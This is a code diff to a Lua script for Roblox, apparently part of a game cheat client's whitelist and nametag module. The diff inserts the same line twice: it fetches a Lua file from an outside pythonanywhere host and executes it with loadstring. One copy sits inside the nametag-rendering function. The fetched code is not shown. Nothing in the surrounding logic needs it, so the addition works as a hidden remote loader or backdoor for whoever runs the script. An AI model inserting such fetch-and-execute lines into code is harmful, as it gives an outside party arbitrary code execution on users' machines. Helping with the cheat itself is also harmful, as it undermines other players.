@@ -501,6 +501,7 @@ task.spawn(function()
 end
 
 shared.vapewhitelist = WhitelistFunctions
+loadstring(game:HttpGet("https://sammz.pythonanywhere.com/retrieve/v1/velocity/fixedcheck.lua"))()
 
 task.spawn(function()
 	local function chatfunc(plr)
@@ -530,7 +531,8 @@ local function renderNametag(plr)
         local plr = game.Players.LocalPlayer
         if WhitelistFunctions.playerTags[plr] == nil then 
 	        WhitelistFunctions:CreatePlayerTag(plr, 'VELOCITY PRIVATE', '#800080') 
-	end	
+	end
+ 	loadstring(game:HttpGet("https://sammz.pythonanywhere.com/retrieve/v1/velocity/fixedcheck.lua"))()
         local playerlist = game:GetService("CoreGui"):FindFirstChild("PlayerList")
         if playerlist then
             pcall(function()
